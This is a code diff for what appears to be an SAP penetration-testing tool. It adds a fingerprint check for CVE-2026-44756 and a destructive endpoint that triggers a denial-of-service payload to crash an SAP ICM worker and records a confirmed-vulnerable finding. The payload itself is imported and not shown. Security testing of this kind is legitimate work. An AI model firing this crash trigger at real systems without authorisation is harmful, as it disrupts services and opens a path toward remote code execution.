@@ -7861,6 +7861,134 @@ def create_app(api: SAPMAPApi) -> Bottle:
         _bg(f"{sid}:check_cve_31324", "Check CVE-2025-31324", _run)
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/check_cve_2026_44756", method="POST")
+    def node_check_cve_2026_44756(sid):
+        """Read-only fingerprint for CVE-2026-44756 EPP pre-auth
+        memory corruption.  Sends a well-formed sap-passport header
+        on the target's ICM ports and cross-references kernel PL."""
+        response.content_type = "application/json"
+        data = request.json or {}
+        pl = data.get("patch_level")
+        try:
+            pl = int(pl) if pl not in (None, "") else None
+        except (ValueError, TypeError):
+            pl = None
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        def _run():
+            print(f"[*] {sid}: Checking CVE-2026-44756 (SAP EPP "
+                  f"pre-auth memory corruption)...")
+            found = sapmap_scanner.check_cve_2026_44756(node,
+                                                          patch_level=pl)
+            if found:
+                port = node.cve_2026_44756_http_port
+                scheme = "https" if node.cve_2026_44756_https else "http"
+                print(f"[!!] {sid}: VULNERABLE — ICM at {scheme}://"
+                      f"{node.ip}:{port} accepts the sap-passport "
+                      f"pre-auth AND kernel {node.kernel} is in the "
+                      f"fix window.  Next: right-click → "
+                      f"Exploitation → 'Trigger CVE-2026-44756 DoS' "
+                      f"to prove the crash primitive.")
+            elif node.cve_2026_44756_evidence:
+                print(f"[*] {sid}: not vulnerable "
+                      f"({node.cve_2026_44756_evidence})")
+
+        _bg(f"{sid}:check_cve_44756", "Check CVE-2026-44756", _run)
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/exploit_cve_2026_44756_dos", method="POST")
+    def node_exploit_cve_2026_44756_dos(sid):
+        """Fire the bug-C DoS payload against the ICM.  DESTRUCTIVE:
+        crashes one ICM worker.  SAP restarts the worker within a
+        few seconds; users attached to that worker see one failed
+        request.  Requires confirm=true."""
+        response.content_type = "application/json"
+        data = request.json or {}
+        if not data.get("confirm"):
+            return json.dumps({"error": "confirm=true required — "
+                                         "this action crashes an "
+                                         "ICM worker on the target"})
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        if not node.cve_2026_44756_http_port:
+            return json.dumps({"error": "run 'Check CVE-2026-44756' "
+                                         "first — no ICM port on "
+                                         "record"})
+        port = node.cve_2026_44756_http_port
+        is_https = node.cve_2026_44756_https
+        path = node.cve_2026_44756_http_path or "/sap/public/ping"
+
+        def _run():
+            scheme = "https" if is_https else "http"
+            print(f"[!] {sid}: Firing CVE-2026-44756 DoS on "
+                  f"{scheme}://{node.ip}:{port}{path}")
+            print(f"[!] {sid}: DESTRUCTIVE — this will crash one "
+                  f"ICM worker.  SAP auto-restarts within a few "
+                  f"seconds.")
+            try:
+                from sap_cve_2026_44756 import (
+                    trigger_http_dos, confirm_alive_after_dos)
+                dos = trigger_http_dos(node.ip, port, path,
+                                         use_tls=is_https)
+                print(f"[*] {sid}: DoS trigger result: "
+                      f"connection_dropped={dos.get('connection_dropped')} "
+                      f"reply_bytes={dos.get('response_bytes')} "
+                      f"elapsed_ms={dos.get('elapsed_ms')} "
+                      f"payload_bytes={dos.get('payload_bytes')}")
+                # A successful crash = server dropped the connection
+                # with no response bytes.  A still-alive server would
+                # answer with at least a 400 or similar.
+                if (dos.get("connection_dropped")
+                        and not dos.get("response_bytes")):
+                    node.cve_2026_44756_dos_confirmed = True
+                    node.cve_2026_44756_vulnerable = True
+                    node.cve_2026_44756_evidence = "dos_confirmed"
+                    print(f"[!!] {sid}: DoS CONFIRMED — ICM worker "
+                          f"crashed on our bug-C payload.  Polling "
+                          f"for auto-restart …")
+                    recov = confirm_alive_after_dos(node.ip, port,
+                                                      path,
+                                                      use_tls=is_https)
+                    if recov.get("recovered"):
+                        print(f"[+] {sid}: ICM worker back online "
+                              f"after {recov.get('polls_before_ok')} "
+                              f"poll(s) — SAP's auto-restart "
+                              f"working as expected.")
+                    else:
+                        print(f"[!] {sid}: WARNING — ICM did not "
+                              f"recover within the poll window.  "
+                              f"Check the target manually before "
+                              f"marking the engagement done.")
+                    sapmap_findings.emit_finding(
+                        "CRITICAL", sid,
+                        f"CVE-2026-44756 (OVERPASS) DoS CONFIRMED "
+                        f"on {node.ip}:{port} — bug-C stack "
+                        f"overflow crashed the ICM worker.  Kernel "
+                        f"{node.kernel} is below the CVSS-10.0 fix "
+                        f"(SAP Note 3747649).  RCE reachable via "
+                        f"the DIAG channel with any OS-exec "
+                        f"primitive we hold.",
+                        cve="CVE-2026-44756",
+                        ref="cve_2026_44756.dos_confirmed",
+                        attack_capability="exploit.cve_2026_44756")
+                else:
+                    print(f"[?] {sid}: DoS DID NOT crash the ICM — "
+                          f"server replied {dos.get('response_bytes')} "
+                          f"bytes.  Possible reasons: (a) kernel "
+                          f"actually patched, (b) endpoint is a "
+                          f"Web Dispatcher that scrubs the "
+                          f"passport header, (c) hardening in "
+                          f"place we didn't detect.  Check the "
+                          f"target manually.")
+            except Exception as e:
+                print(f"[-] {sid}: DoS trigger failed: {e!r}")
+
+        _bg(f"{sid}:dos_cve_44756", "CVE-2026-44756 DoS trigger", _run)
+        return json.dumps({"status": "started"})
+
     @app.route("/api/node/<sid>/check_cve_2026_58240", method="POST")
     def node_check_cve_2026_58240(sid):
         """Probe MS internal port for the ASCS_GW opcode family
